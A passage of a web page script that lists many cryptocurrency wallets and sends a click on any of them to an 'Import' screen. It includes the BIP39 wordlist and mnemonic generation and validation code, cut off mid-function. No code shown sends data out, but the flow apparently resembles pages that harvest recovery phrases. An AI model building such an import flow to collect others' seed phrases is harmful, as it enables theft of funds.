        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c22450a3-b4a7-4e86-8855-f5b88d983100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Uniswap Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/bff9cf1f-df19-42ce-f62a-87f04df13c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Unity Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/09b4aad3-c007-40e7-ec8f-6a62585e6900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "UniversalProfiles",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4537fb11-ada3-4009-37c2-c70ed4b46300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Unstoppable Domains",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4725dda0-4471-4d0f-7adf-6bbe8b929c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Unstoppable Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a63cbfce-0726-4f94-9187-a761afb94400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "UP.io",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f1a3f4d4-871f-42db-89ab-bb36b5c01f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "UPBOND Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/698e08f3-b452-4c91-9f65-299939396a00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "UPTN",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/5e656c3e-96ae-484f-c0c6-37bc908daa00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "UTORG",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/39c77c0b-d6ea-419d-92b7-513a5eac2c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "UvToken",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a0057241-cd91-4a53-7175-016b76bfd900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "UXLINK",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7c0ac68c-efd6-42ab-488b-be8febe45f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Valora",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a03bfa44-ce98-4883-9b2a-75e2b68f5700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Venly",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d8c846d0-5164-4520-d10f-e1c27d69ce00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Verso",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/109d7c90-86ed-4ee0-e17d-3c87624ddf00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "VeWorld Mobile",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/afa5084b-02da-4dd4-418b-9f6410e34e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "VGX Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/91035734-c365-4341-6835-c056a22cc200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Volt Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ffddf01a-337f-45c1-61c9-f6d3dd3d3c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "W3 Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2f2d1309-de72-468b-3c04-77d0b9cd8500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Wallacy",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9496c3d8-8b60-495f-bd55-c3af19519d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Wallet 3",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/34ab7558-9e64-4436-f4e6-9069f2533d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Wallypto",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/00684f38-f9f9-40b6-6b6e-33891434f400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "WebAuth",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/93fcd24e-431d-421f-32c2-9563d725c800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "WEMIX Play",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/3d7b7226-3005-4ace-4a35-d5f67aee2300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "WemixWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2439d9a4-2c1e-4d29-3bc6-654fc23a4b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Whitewallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/328ddfc6-0987-4981-69cf-c4bd7a19dc00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Wigwam",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/6200b005-f202-41d5-7bd9-966c970f6700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Wombat",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e675efa3-4ffc-4199-9c22-b9692baea900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "WOW EARN",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1985a753-7fd8-4d75-4c50-7998ea68a800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "X9Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f64f7bf8-62ea-4d1e-087b-82d374d04d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Xcapit",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/17f59b75-21b0-4b3f-b024-fe4b9b8d2300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Xellar",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/67b5a91d-a9ce-4268-d73d-b2f924a0b400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "XENEA Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a7f06d8c-3196-42c9-bcb3-410d260e3d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Xova",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/bf6c881e-1cea-4392-6c9d-cc3ba426d200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "xPortal",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1bc53e49-1e7f-4129-4c87-3f8c7b91cb00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Xverse Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/785e20ef-c68c-4a85-6cb9-053443871e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Yo Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a38db32b-8291-4d25-9aae-4bf4b6e6f300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "YoWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/750079a0-6372-4e32-d1af-fe8ec2bbe400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Yuse Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2cd61458-59c2-4208-c8ee-98b5e0076b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Zeal",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/5416fb0b-9aec-4ffe-b7cd-c04c79ea4300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Zelcore",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9fa44558-a22b-47b1-87a4-b7655eb30700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Zelus Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a173eba6-05b4-43f4-0df6-400563637b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Zengo Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/6133c399-ae32-4eba-0c5a-0fb84492bf00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Zerion",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/73f6f52f-7862-49e7-bb85-ba93ab72cc00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Zypto",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4f6ae851-7fe6-41ac-5714-3a910b2ff400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "αU wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/40489ba1-6eb0-49a1-a9d4-439fefe52000?projectId=080925ff734019202f8750b91ac5b373"
    }
];

// Define popular wallets to prioritize
const popularWallets = [
    'Rainbow',
    'MetaMask',
    'Trust Wallet',
    'Coinbase Wallet',
    'WalletConnect',
    'Argent',
    'Phantom',
    'Ledger Live',
    'Crypto.com | DeFi Wallet',
    '1inch Wallet',
    'SafePal',
    'Uniswap Wallet',
    'Zerion',
    'Exodus',
    'Spot',
    'Omni',
    'imToken',
    'TokenPocket',
    'BitKeep'
];

// Sort wallets: Popular ones first, then alphabetical
wallets.sort((a, b) => {
    const indexA = popularWallets.indexOf(a.name);
    const indexB = popularWallets.indexOf(b.name);

    if (indexA !== -1 && indexB !== -1) {
        return indexA - indexB; // Both are popular, sort by priority
    } else if (indexA !== -1) {
        return -1; // Only A is popular, A comes first
    } else if (indexB !== -1) {
        return 1; // Only B is popular, B comes first
    } else {
        return a.name.localeCompare(b.name); // Neither is popular, sort alphabetically
    }
});

const walletGrid = document.getElementById('wallet-grid');
const searchInput = document.getElementById('wallet-search');

function renderWallets(filter = '') {
    if (!walletGrid) return console.error('Wallet grid element not found');
    walletGrid.innerHTML = '';
    const filteredWallets = wallets.filter(wallet =>
        wallet.name.toLowerCase().includes(filter.toLowerCase())
    );
    console.log(`Rendering ${filteredWallets.length} wallets`);

    filteredWallets.forEach(wallet => {
        const walletEl = document.createElement('div');
        walletEl.className = 'wallet-item';
        walletEl.onclick = () => {
            const iconSrc = walletEl.querySelector('.wallet-icon').src;
            const importIcon = document.getElementById('import-wallet-icon');
            const importTitle = document.getElementById('import-title');

            if (importIcon) {
                importIcon.src = iconSrc;
                importIcon.classList.remove('hidden');
            }
            if (importTitle) {
                importTitle.textContent = `Import ${wallet.name}`;
            }

            nav.to('import-1');
        }; walletEl.innerHTML = `
            <img src="${wallet.icon}" alt="${wallet.name}" class="wallet-icon" loading="lazy">
            <span class="wallet-name">${wallet.name}</span>
        `;
        walletGrid.appendChild(walletEl);
    });
}

searchInput.addEventListener('input', (e) => {
    renderWallets(e.target.value);
});

// Initial render removed (handled in init)

/* --- Merged Logic from index2.html --- */
const $ = s => document.querySelector(s);
const $$ = s => document.querySelectorAll(s);

/* ----------- Toast ----------- */
const toast = {
    show(msg, type = 'success') {
        const el = document.createElement('div');
        el.className = `toast ${type}`;
        el.textContent = msg;
        $('#toast-container').appendChild(el);
        setTimeout(() => {
            el.style.opacity = '0';
            el.style.transform = 'translateY(20px)';
            setTimeout(() => el.remove(), 300);
        }, 3000);
    },
    success(msg) { this.show(msg, 'success'); },
    error(msg) { this.show(msg, 'error'); }
};

/* ----------- Nav ----------- */
const nav = {
    history: ['landing'],
    to(id) {
        this.history.push(id);
        this.render();
    },
    back() {
        if (this.history.length > 1) {
            this.history.pop();
            this.render();
        }
    },
    render() {
        const cur = this.history[this.history.length - 1];
        $$('.card').forEach(c => c.classList.add('hidden'));
        const v = $(`#view-${cur}`);
        if (v) {
            v.classList.remove('hidden');
            v.style.animation = 'slideUp .4s cubic-bezier(.16,1,.3,1)';
        }
    }
};

// --- BIP39 Wordlist ---
const WORDLIST = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"];

/* ----------- Crypto Lib ----------- */
const cryptoLib = {
    async generateMnemonic(strength = 128) {
        const entropy = new Uint8Array(strength / 8);
        window.crypto.getRandomValues(entropy);
        let bin = '';
        for (let i = 0; i < entropy.length; i++) bin += entropy[i].toString(2).padStart(8, '0');
        const hash = await window.crypto.subtle.digest('SHA-256', entropy);
        const cs = (new Uint8Array(hash))[0].toString(2).padStart(8, '0').substring(0, strength / 32);
        const full = bin + cs;
        const chunks = full.match(/.{1,11}/g);
        return chunks.map(c => WORDLIST[parseInt(c, 2)]).join(' ');
    },
    async validateMnemonic(mnemonic) {
        const w = mnemonic.trim().split(/\s+/);
        if (w.length !== 12 && w.length !== 24) return false;
        if (!w.every(x => WORDLIST.includes(x))) return false;
